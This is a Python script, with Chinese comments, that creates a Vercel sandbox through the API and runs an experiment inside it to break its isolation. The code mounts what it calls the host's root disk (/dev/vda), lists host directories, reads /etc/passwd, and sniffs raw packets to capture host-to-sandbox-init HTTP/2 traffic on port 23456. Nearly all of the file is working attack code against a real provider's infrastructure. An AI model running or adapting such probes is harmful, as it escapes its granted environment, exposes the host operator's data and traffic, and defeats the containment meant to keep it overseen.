# 实验J46: mount /dev/vda + AF_PACKET 抓宿主→sandbox-init 流量
# 目标: 文件系统级访问宿主 rootfs; 抓取 23456 的 HTTP/2 请求提取路径/头
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj46"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import socket, re, os, subprocess, time, threading

print("===== [1] mount /dev/vda 测试 =====", flush=True)
os.makedirs("/mnt/vda", exist_ok=True)
r = subprocess.run(["mount", "-t", "xfs", "-o", "ro,nouuid", "/dev/vda", "/mnt/vda"],
                   capture_output=True, text=True)
print("mount RC=%d out=%r err=%r" % (r.returncode, r.stdout[:300], r.stderr[:500]), flush=True)
if r.returncode == 0:
    print("=== /mnt/vda ===", flush=True)
    print(subprocess.run(["ls", "-la", "/mnt/vda"], capture_output=True, text=True).stdout, flush=True)
    print("=== /mnt/vda/run ===", flush=True)
    print(subprocess.run(["ls", "-la", "/mnt/vda/run"], capture_output=True, text=True).stdout[:2000], flush=True)
    print("=== /mnt/vda/opt ===", flush=True)
    print(subprocess.run(["ls", "-la", "/mnt/vda/opt"], capture_output=True, text=True).stdout[:2000], flush=True)
    print("=== /mnt/vda/volumes ===", flush=True)
    print(subprocess.run(["ls", "-la", "/mnt/vda/volumes"], capture_output=True, text=True).stdout[:2000], flush=True)
    print("=== /mnt/vda/etc/passwd ===", flush=True)
    print(open("/mnt/vda/etc/passwd").read()[:1500], flush=True)

print("===== [2] 抓包准备 =====", flush=True)
# 列出接口
for f in os.listdir("/sys/class/net"):
    print("iface:", f, flush=True)
# 绑定 eth0 抓包 (后台线程 40 秒)
stop = threading.Event()
frames = []
def sniffer():
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        s.bind(("eth0", 0))
        s.settimeout(1.0)
        t0 = time.time()
        while not stop.is_set() and time.time() - t0 < 45:
            try:
                data, addr = s.recvfrom(65535)
                frames.append(data)
            except socket.timeout:
                continue
        s.close()
    except Exception as e:
        print("sniffer ERR: %s" % e, flush=True)
th = threading.Thread(target=sniffer)
th.start()
print("sniffer started, waiting 45s...", flush=True)
# 等待期间: 用 API 触发宿主活动 (通过命令本身和睡眠; 沙箱 API 调用本身会经宿主转发)
time.sleep(45)
stop.set()
th.join(timeout=10)
print("captured frames: %d" % len(frames), flush=True)

# [3] 提取 TCP 23456 相关流量
print("===== [3] TCP 23456 流量分析 =====", flush=True)
tcp_pkts = []
for i, f in enumerate(frames):
    if len(f) < 54:
        continue
    eth_type = int.from_bytes(f[12:14], "big")
    if eth_type == 0x0800:  # IPv4
        ihl = (f[14] & 0x0F) * 4
        proto = f[14 + 9]
        if proto == 6:  # TCP
            src = f[14+ihl:14+ihl+4]
            dst = f[14+ihl+4:14+ihl+8]
            sport = int.from_bytes(f[14+ihl+20:14+ihl+22], "big")
            dport = int.from_bytes(f[14+ihl+22:14+ihl+24], "big")
            if sport == 23456 or dport == 23456:
                payload = f[14+ihl+20+4:14+ihl+20+4+40]
                tcp_pkts.append((sport, dport, payload))
    elif eth_type == 0x86DD:  # IPv6
        pass
print("23456 tcp packets: %d" % len(tcp_pkts), flush=True)
all_payload = b"".join(p for _, _, p in tcp_pkts)
print("total payload bytes: %d" % len(all_payload), flush=True)
# 提取 ASCII 字符串
strs = re.findall(rb"[\x20-\x7e]{4,}", all_payload)
print("strings in 23456 traffic:", len(strs), flush=True)
for s in strs[:80]:
    print("  %r" % s.decode('latin1'), flush=True)
# 也看所有包里的 ASCII (HTTP/2 头可能在任意包)
all_data = b"".join(frames)
strs2 = re.findall(rb"[\x20-\x7e]{4,}", all_data)
# 找路径特征
paths = [s for s in strs2 if b"/" in s and len(s) > 6]
uniq = []
for p in paths:
    if p not in uniq:
        uniq.append(p)
print("path-like strings total:", len(uniq), flush=True)
for p in uniq[:50]:
    print("  PATH? %r" % p.decode('latin1'), flush=True)
'''
run_cmd(sid, SCAN, "mount-vda-sniff-host", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
